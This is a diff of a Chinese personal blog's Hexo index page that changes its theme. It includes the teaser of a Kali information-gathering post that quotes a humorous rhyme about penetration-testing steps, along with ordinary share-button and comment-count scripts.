 </li>
 </ul>
 
-      
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://my.yfgeek.com/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/" data-id="cisyte7cr0001zds56ivso2zz" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/08/01/kalixi-lie-xin-xi-shou-ji-jie-duan-yi/">评论</a>
+    
+
+        </footer>
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原创-Hack/"> - 原创 - Hack</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
 </article>
 
 
 
-
-
-
-
-
-
-  
     <article id="post-hack1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/07/30/hack1/" class="article-date">
-  	<time datetime="2016-07-30T09:48:20.000Z" itemprop="datePublished">2016-07-30</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
+    <div class="article-inner">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/07/30/hack1/">Kali系列——信息收集阶段（一）</a>
-    </h1>
-  
-
-      </header>
-      
+        
+            <header class="article-header">
+                
     
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：</p>
+        <h1 itemprop="name">
+            <a class="article-title" href="/2016/07/30/hack1/">Kali系列——信息收集阶段（一）</a>
+        </h1>
+    
+
+                
+                    <div class="article-meta">
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2016/07/30/hack1/">
+            <time datetime="2016-07-30T09:48:20.000Z" itemprop="datePublished">2016-07-30</time>
+        </a>
+    </div>
+
+
+                        
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/原创-Hack/"> - 原创 - Hack</a>
+    </div>
+
+                    </div>
+                
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+            <p><p>记得前几周去参加过一个阿里巴巴举办的安全峰会，其中一个大牛讲到以前的渗透测试三字经，当场真是笑出声：</p>
 <blockquote>
 <p>进谷歌 找注入 没注入 就旁注 没旁注 用0day 没0day 猜目录 没目录 就嗅探</p>
 <p>爆账户 找后台 传小马 放大马 拿权限 挂页面  放暗连 清数据 拿不下 去自杀 死不了 继续来 查资料 去社工！</p>
@@ -893,106 +1532,302 @@
 <blockquote>
 <p>信息收集阶段-&gt;漏洞检测阶段-&gt;漏洞利用阶段-&gt;持久化后门阶段</p>
 </blockquote>
-<p>最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。<br>
-      
+<p>最近借了本好书《高度安全环境下的高级渗透测试》，这本书内容浅显易懂，但却很实用，虽然很多内容都知道，但是不成系统，这本书总结工作做得非常好，总结一下读书笔记。<br></p>
+            <p class="article-more-link">
+                <a href="/2016/07/30/hack1/#more">查看更多</a>
+            </p>
+        
+        </div>
+        <footer class="article-footer">
+            <div class="share-container">
+
+
+
+</div>
+
+    <a data-url="http://my.yfgeek.com/2016/07/30/hack1/" data-id="cisyte7d20004zds5o3fxvtzx" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+<script>
+    (function ($) {
+        // Prevent duplicate binding
+        if (typeof(__SHARE_BUTTON_BINDED__) === 'undefined' || !__SHARE_BUTTON_BINDED__) {
+            __SHARE_BUTTON_BINDED__ = true;
+        } else {
+            return;
+        }
+        $('body').on('click', function() {
+            $('.article-share-box.on').removeClass('on');
+        }).on('click', '.article-share-link', function(e) {
+            e.stopPropagation();
+
+            var $this = $(this),
+                url = $this.attr('data-url'),
+                encodedUrl = encodeURIComponent(url),
+                id = 'article-share-box-' + $this.attr('data-id'),
+                offset = $this.offset(),
+                box;
+
+            if ($('#' + id).length) {
+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://my.yfgeek.com/2016/07/30/hack1/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://my.yfgeek.com/2016/07/30/hack1/">评论</a>
+    
+
+        </footer>
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/原创-Hack/"> - 原创 - Hack</a></li></ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a  href="/2016/07/30/hack1/#more">more >></a>
-        </p>
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
 </article>
 
 
 
-
-
-
-
-
-
-  
-  
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+        <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">下一页 &raquo;</a>
     </nav>
-  
-</div>
-      <footer id="footer">
-  <div class="outer">
-    <div id="footer-info">
-    	<div class="footer-left">
-    		&copy; 2016 Ivan
-    	</div>
-      	<div class="footer-right">
-      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
-      	</div>
-    </div>
-  </div>
-</footer>
-    </div>
+</section>
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/08/26/templcd/" class="thumbnail">
     
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"></p>
+                            <p class="item-title"><a href="/2016/08/26/templcd/" class="title">树莓派实时温湿度监测进阶</a></p>
+                            <p class="item-date"><time datetime="2016-08-26T07:19:14.000Z" itemprop="datePublished">2016-08-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/08/25/ba-kalifang-dao-upan-li/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"></p>
+                            <p class="item-title"><a href="/2016/08/25/ba-kalifang-dao-upan-li/" class="title">把KALI放到U盘里</a></p>
+                            <p class="item-date"><time datetime="2016-08-25T11:26:45.000Z" itemprop="datePublished">2016-08-25</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/08/25/rpi-tmp-hdt-platform/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"></p>
+                            <p class="item-title"><a href="/2016/08/25/rpi-tmp-hdt-platform/" class="title">基于树莓派的实时温度湿度监测平台</a></p>
+                            <p class="item-date"><time datetime="2016-08-25T05:39:08.000Z" itemprop="datePublished">2016-08-25</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/08/20/916/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"></p>
+                            <p class="item-title"><a href="/2016/08/20/916/" class="title">我怀念的依旧是916</a></p>
+                            <p class="item-date"><time datetime="2016-08-20T15:22:01.000Z" itemprop="datePublished">2016-08-20</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2016/08/12/hai-wai-appsheng-cun-zhi-nan/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"></p>
+                            <p class="item-title"><a href="/2016/08/12/hai-wai-appsheng-cun-zhi-nan/" class="title">海外App生存指南</a></p>
+                            <p class="item-date"><time datetime="2016-08-12T15:13:34.000Z" itemprop="datePublished">2016-08-12</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">归档</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">八月 2016</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">七月 2016</a><span class="archive-list-count">5</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">标签</h3>
+        <div class="widget">
+            <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali-转载/"> - Kali - 转载</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/原创/"> - 原创</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/原创-Hack/"> - 原创 - Hack</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/原创-Tool/"> - 原创 - Tool</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/原创-树莓派/"> - 原创 - 树莓派</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/树莓派-原创/"> - 树莓派 - 原创</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/转载-Hack/"> - 转载 - Hack</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/转载-Tool/"> - 转载 - Tool</a><span class="tag-list-count">3</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">标签云</h3>
+        <div class="widget tagcloud">
+            <a href="/tags/Kali-转载/" style="font-size: 10px;"> - Kali - 转载</a> <a href="/tags/原创/" style="font-size: 15px;"> - 原创</a> <a href="/tags/原创-Hack/" style="font-size: 20px;"> - 原创 - Hack</a> <a href="/tags/原创-Tool/" style="font-size: 10px;"> - 原创 - Tool</a> <a href="/tags/原创-树莓派/" style="font-size: 10px;"> - 原创 - 树莓派</a> <a href="/tags/树莓派-原创/" style="font-size: 10px;"> - 树莓派 - 原创</a> <a href="/tags/转载-Hack/" style="font-size: 10px;"> - 转载 - Hack</a> <a href="/tags/转载-Tool/" style="font-size: 20px;"> - 转载 - Tool</a>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://hexo.io">Hexo</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
 
 
-<script>
-	var yiliaConfig = {
-		fancybox: true,
-		mathjax: true,
-		animate: true,
-		isHome: true,
-		isPost: false,
-		isArchive: false,
-		isTag: false,
-		isCategory: false,
-		open_in_new: false,
-		root: /
-	}
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2016 Ivan<br>
+            Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
+        </div>
+    </div>
+</footer>
+        
+    
+    <script>
+    var disqus_config = function () {
+        
+        this.page.identifier = 'undefined';
+    };
+    (function() { 
+        var d = document, s = d.createElement('script');  
+        s.src = '//' + 'hexo-theme-icarus' + '.disqus.com/count.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
 </script>
-<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+
+
+    
+        <script src="/vendor/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-share.min.js"></script>
+        <script src="/vendor/lightgallery/js/lg-video.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
 <script src="/js/main.js"></script>
 
-
-
-
-
-
-<script type="text/x-mathjax-config">
-MathJax.Hub.Config({
-    tex2jax: {
-        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-        processEscapes: true,
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-    }
-});
-
-MathJax.Hub.Queue(function() {
-    var all = MathJax.Hub.getAllJax(), i;
-    for(i=0; i < all.length; i += 1) {
-        all[i].SourceElement().parentNode.className += ' has-jax';                 
-    }       
-});
-</script>
-
-<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-
-
-  </div>
+    </div>
 </body>
 </html>
